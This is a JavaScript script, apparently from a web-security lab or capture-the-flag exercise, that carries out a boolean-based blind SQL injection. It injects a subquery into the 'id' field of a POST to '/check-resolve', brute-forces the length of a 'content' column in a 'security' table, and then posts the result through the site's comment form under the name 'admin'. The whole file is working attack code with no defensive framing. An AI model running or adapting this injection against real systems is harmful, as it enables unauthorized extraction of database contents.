// Base information
const url = '/check-resolve';
const max_length = 50; // Example max length, adjust as needed
let discovered_length = 0;

// Helper function to check the length
function checkLength(possible_length) {
  return fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: `id=1 and (SELECT length(content) FROM security WHERE id = 6) = ${possible_length}`
  })
  .then(response => response.text())
  .then(text => {
    if (text.includes("Done")) { // Assuming "Done" indicates success
      discovered_length = possible_length;
      return true; // Correct length found
    }
    return false; // Incorrect length, continue searching
  });
}

// Function to post the discovered length
function postDiscoveredLength(length) {
  const postData = new URLSearchParams({
    comment2: length.toString(),
    "comment-author": "admin"
  });

  return fetch("/post-comment", {
    method: "POST",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: postData
  });
}

// Sequentially try each length until the correct one is found or max length reached
async function findContentLength() {
  for (let possible_length = 1; possible_length <= max_length; possible_length++) {
    const found = await checkLength(possible_length);
    if (found) {
      console.log(`Found content length: ${possible_length}`);
      // Post the discovered length
      postDiscoveredLength(possible_length)
        .then(response => {
          console.log('Content length was successfully posted.');
        })
        .catch(error => {
          console.error('Failed to post content length:', error);
        });
      return possible_length; // Stop searching once length is found
    }
  }
  console.log("Failed to discover the content length.");
  return 0; // Return 0 if no length was found
}

// Start the process
findContentLength();
